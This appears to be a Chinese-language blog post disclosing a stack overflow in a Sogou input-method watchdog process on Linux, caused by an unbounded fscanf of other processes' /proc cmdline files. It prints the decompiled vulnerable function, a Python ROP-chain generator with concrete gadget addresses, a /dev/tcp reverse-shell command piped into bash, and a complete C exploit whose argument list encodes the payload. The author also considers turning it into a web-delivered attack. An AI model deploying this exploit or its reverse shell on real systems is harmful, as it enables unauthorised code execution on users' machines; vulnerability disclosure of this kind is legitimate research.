---
layout: post
title:  "sogou_stack_overflow"
date:   2019-01-02 13:01:05 +0000
categories: jekyll update
---

## 0x00 前言

这个漏洞其实根本就是人在家中坐，洞从天上来。。。本菜鸟没做任何的fuzz，就是他直接在我的电脑上崩了。。。我所唯一做的其实是我在做一道pwn的时候，这个pwn的输入是argv\[1\]，溢出也是这个参数所导致的。。所以我给了一个很长的命令行参数，然后结果另外一个搜狗输入法的服务崩了。。。

![coredump.png](coredump)

## 0x01 漏洞点

作为一个玩二进制安全的新手，第一反应是看看crash信息，一看崩溃点是在一个ret上面。我就想这不会是什么栈溢出吧。。。拖进IDA找到ret的位置0x40A260

```c
__int64 vuln()
{
  DIR *dir; // rbx
  struct dirent *v1; // rax
  const char *p; // rbp
  char c; // al
  unsigned __int8 char_to_int; // dl
  const char *p_; // rax
  __pid_t pid; // er13
  FILE *v7; // r8
  FILE *stream; // ST00_8
  char *v9; // rax
  unsigned int v10; // ebp
  char filename[512]; // [rsp+10h] [rbp-638h]
  char s[512]; // [rsp+210h] [rbp-438h]
  char buf[512]; // [rsp+410h] [rbp-238h]

  dir = opendir("/proc/");
  if ( !dir )
  {
    v10 = -2;
    perror("Couldn't open the /proc/ directory");
    return v10;
  }
LABEL_2:
  while ( 1 )
  {
    v1 = readdir(dir);
    if ( !v1 )
      break;
    if ( v1->d_type == DT_DIR )
    {
      p = v1->d_name;
      c = v1->d_name[0];
      if ( c )
      {
        char_to_int = c - '0';
        p_ = p;
        if ( char_to_int <= 9u )
        {
          while ( *++p_ )
          {
            if ( (unsigned __int8)(*p_ - '0') > 9u )
              goto LABEL_2;
          }
          goto all_number;
        }
      }
      else
      {
all_number:
        pid = getpid();
        if ( pid != (unsigned int)strtol(p, 0LL, 10) )
        {
          memset(filename, 0, sizeof(filename));
          qmemcpy(filename, "/proc/", 6);
          __strcpy_chk((__int64)&filename[6], (__int64)p, 0x200LL);
          __strcat_chk(filename, "/cmdline", 0x200LL);
          v7 = fopen(filename, "rt");
          if ( v7 )
          {
            memset(s, 0, sizeof(s));
            memset(buf, 0, sizeof(buf));
            fscanf(v7, "%s", s, v7);//溢出点
            fclose(stream);
            v9 = strrchr(s, '/');
            if ( v9 )
              __strcpy_chk((__int64)buf, (__int64)(v9 + 1), 0x200LL);
            else
              __strcpy_chk((__int64)buf, (__int64)s, 0x200LL);
            if ( sub_409470(buf, "fcitx", 0) )
            {
              v10 = strtol(p, 0LL, 10);
              closedir(dir);
              return v10;
            }
          }
        }
      }
    }
  }
  v10 = -1;
  closedir(dir);
  return v10;
}
```

果然，fscanf存在缓冲区溢出，s的大小为512字节，而fscanf是一个危险的函数，没有任何缓冲区长度的限制。

找到溢出点之后，就要看看我们能不能控制输入。如果可以，就能成功利用。那么输入点是什么，往上看，这个file是通过fopen打开的。而fopen的文件路径是什么？经过逆向分析，这个函数实际上是在遍历/proc这个文件夹。查阅资料，这个文件夹存放所有的进程的信息，而进程pid是文件夹名。这个函数会遍历这个文件夹，然后如果是一个纯数字文件夹，就打开他里面的cmdline的内容，然后fscanf进行读取。如果第一个参数存在子串fcitx（不区分大小写），便返回这个进程的pid。如果查阅资料，发现cmdline存放的是命令行的数据。但是是parse好的（参数之间用\\0分隔开）。

fscanf获取所有进程的命令行参数时存在溢出，好吧，看看能不能利用。

PS：

```c
__strcpy_chk((__int64)&filename[6], (__int64)p, 0x200LL);
```

这个地方其实也有溢出6个字节，但是感觉没法利用。。。

## 0x02 构造payload

接下来看看能不能利用。checksec发现没有canary也没有PIE，好消息，这样就能用ROP了。

这里顺便说一下fscanf这个函数，他其实遇到\x00不会截断，但是遇到空格回车就会截断了，所以构造payload的时候要防止这几个字符的出现。

### system函数

看下这个文件，发现有system函数可用，很幸运。

```assembly
.plt:0000000000406D80 ; int system(const char *command)
.plt:0000000000406D80 _system         proc near               ; CODE XREF: sub_409490+9D↓p
.plt:0000000000406D80                                         ; sub_40A660+9F3↓p ...
.plt:0000000000406D80                 jmp     cs:off_68F258
.plt:0000000000406D80 _system         endp
```

我们的目标是，反弹一个shell到本机端口上面，即，执行

```bash
`/bin/sh >& /dev/tcp/127.0.0.1/8080 0>&1`
```

但是，system函数（/bin/dash）好像并不支持>&这种语法，所以要写成

```python
"echo \"/bin/sh >& /dev/tcp/127.0.0.1/8080 0>&1\" | /bin/bash\x00"
```

### ROP

接着开始思考如何构造ROP。

首先我们需要把这个字符串写入到一片内存，然后用这片内存的起始地址作为参数调用system。

用ROPgadget搜索ROP，发现很多gadget可以用（这种商业程序开起优化来能用的gadget就是多啊，一般CTF最多就一个leave\+ret。。。）

但是问题来了，不能出现空格，而这里空格是无法避免的，所以我们可以先写进去一个\!然后动态减1让他变成空格（空格的ASCII就是感叹号减1）

用到的ROP基本上就是套路了，用了pop reg; ret来让寄存器加载我们的数据，然后xchg mem, reg 来把值写入内存。然后sub mem, reg来进行减一操作，具体用到的是

```python
# 0x0000000000408ed5 pop rbp ; ret
# 0x0000000000418fa0 pop rcx ; ret
# 0x000000000046e162 xchg dword ptr [rcx], ebp ; ret
# 0x0000000000462DD6 sub [rdi], cl
# 0x0000000000407912 pop rdi ; ret
```

然后生成payload的代码是

```python
def get_space_idx(payload):
	ret = []
	new_payload = ""
	length = len(payload)
	for i in xrange(0, length):
		if payload[i] == " ":
			ret.append(i)
			new_payload += "!" # ! is space + 1 in ASCII
		else:
			new_payload += payload[i]

	return ret, new_payload

def form_rop_chain(buf_addr, old_payload):
	spaces_idx, payload = get_space_idx(old_payload)
	payload += (4 - (len(payload) % 4)) * "\x00"
	ret = ""
	pop_rbp_ret = p64(0x408ed5)
	pop_rcx_ret = p64(0x418fa0)
	pop_rdi_ret = p64(0x407912)
	xchg_ret = p64(0x46e162)
	sub_rdi_cl = p64(0x462DD6)
	payload_len = len(payload)
	i = 0
	while i < payload_len:
		ret += pop_rbp_ret
		ret += payload[i:i+4]
		ret += "A"*4
		ret += pop_rcx_ret
		ret += p64(i + buf_addr)
		ret += xchg_ret
		i += 4
	for j in xrange(0, len(spaces_idx)):
		ret += pop_rcx_ret
		ret += p64(1)
		ret += pop_rdi_ret
		ret += p64(spaces_idx[j] + buf_addr)
		ret += sub_rdi_cl

	ret += pop_rdi_ret
	ret += p64(buf_addr) # rdi是参数所存放的寄存器

	ret += p64(0x406D80) # system
	ret += p64(0)
	return ret
```

其中，buf\_addr是目标内存地址，这里会给一个\.data的地址，而old\_payload是所需要写入的字符串，即前面所说的一句话反弹shell指令。

说下所遇到的坑，就是我在调的时候太久没调x64程序了，然后就犯蠢了，忘了第一个参数是rdi，把第一个参数放在了栈中。然后rdi又刚好指向最后一个空格，所以搞得我一直没发现。。。

### 利用Linux参数传递性质讲payload装入cmdline文件

接着我们发现，我们需要让我们的缓冲区填充\+payload放入cmdline文件，这样fscanf才能读到他。那么又有一个问题了，参数之间只能有一个'\\x00'，但是我们需要很多个连续的0，怎么办？这个时候我琢磨到一个技巧，就是给一个空参数，就会产生连续的0。比方说./xxx "" aaa，在./xxx和aaa之间，就有两个\\0。

具体实现代码如下：

```python
def payload_to_args(payload):
	length = len(payload)
	ret = []
	ret.append("")
	idx = 0
	for i in xrange(0, length):
		if payload[i] != '\x00':
			ret[idx] += payload[i]
		else:
			ret.append("")
			idx += 1
	return ret
```

这个函数就是把payload转换成array，使得如果用这个array作为参数创建进程的话，能使得cmdline文件中的内容是原来的payload。

这样的话，payload就构造完成了，到时候就会把填充\+ROP fscanf到栈里面并且溢出，然后走我们的ROP，最后执行反弹shell的命令（其实打开一个正向shell也可以）

## 0x03 最大化利用漏洞

很不幸的是，这个watchdog服务不是root运行的，所以并没有提权到root的功能（如果这个洞没用就尴尬了）

然后我又想，如果能把这个洞作为网马。比方说，JavaScript能调用本地的某个服务，任意一个都行，并且能控制他的参数（比方说flash什么的？然而看了看flash好像并不能控制他的参数），就可以作为网马来使了。可惜并没有。。。

所以总不可能一个任意代码执行的栈溢出到了搜狗的src只能爆个低危吧！这个时候看看能不能从guest提权到本地用户？

改成C语言

```c
#include <unistd.h>
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
void exploit()
{
	printf("start exploiting\n");
	getchar();
	execl("./expl", "./expl", "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xd5\x8e\x40", "", "", "", "", "\x65\x63\x68\x6f\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x21\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x21\x22\x2f\x62\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x25\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x69\x6e\x2f\x73\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x29\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x68\x21\x3e\x26\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x2d\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x21\x2f\x64\x65\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x31\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x76\x2f\x74\x63\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x35\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x70\x2f\x31\x32\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x39\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x37\x2e\x30\x2e\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x3d\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x30\x2e\x31\x2f\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x41\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x38\x30\x38\x30\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x45\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x21\x30\x3e\x26\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x49\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x31\x22\x21\x7c\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x4d\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x21\x2f\x62\x69\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x51\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x6e\x2f\x62\x61\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x55\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xd5\x8e\x40", "", "", "", "", "\x73\x68", "", "\x41\x41\x41\x41\xa0\x8f\x41", "", "", "", "", "\x59\xf6\x68", "", "", "", "", "\x62\xe1\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x25\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x2e\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x31\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x49\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x4f\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\xa0\x8f\x41", "", "", "", "", "\x01", "", "", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x51\xf6\x68", "", "", "", "", "\xd6\x2d\x46", "", "", "", "", "\x12\x79\x40", "", "", "", "", "\x21\xf6\x68", "", "", "", "", "\x80\x6d\x40", "", "", "", "", "", "", "", "", "", "", "", "", "", (char*)NULL);
}

void rerun(const char* fcitx_pid)
{
	execl("./expl", "./expl", fcitx_pid, (char*)NULL);
}
int main(int argc, char const *argv[])
{
	if (strcmp(argv[0], "./expl") != 0)
	{
		fprintf(stderr, "name of the exploit must be expl\n");
		return -1;
	}
	if (argc <= 1)
	{
		printf("first argument is the lowest pid of process with name containing fcitx\n");
		return -1;
	}
	else if (argc > 2)
	{
		printf("press any key to stop\n");
		getchar();
		//block to let watchdog to fscanf this process' arguments
		return 0;
	}
	else
	{//run directly
		pid_t fcitx_pid = atoi(argv[1]);
		pid_t pid = getpid();
		printf("pid: %u\n", pid);
		//sleep(2); without sleep, the ps -ef and /proc cannot see the process
		//optimization purpose?
		//bug or feature?
		//todo
		if (pid > fcitx_pid)
		{
			pid_t ret = fork();
			if (ret == 0)
			{//child
				rerun(argv[1]);
			}
			else if (ret > 0)
			{//parent
				return 0;
			}
			else
			{
				printf("error: cannot fork\n");
				return -1;
			}
		}
		else
		{
			exploit();
		}
	}
	return 0;
}

```

参数是进程名带有fcitx的所有进程的最小pid，如果当前分配到的比较小的话，会把linux的pid滚一次，使得分配到的pid比fcitx的小，这样的话要运行两次（不知道为什么，fork太快在/proc就看不到进程了。。不知道是Linux的bug还是feature。。。）
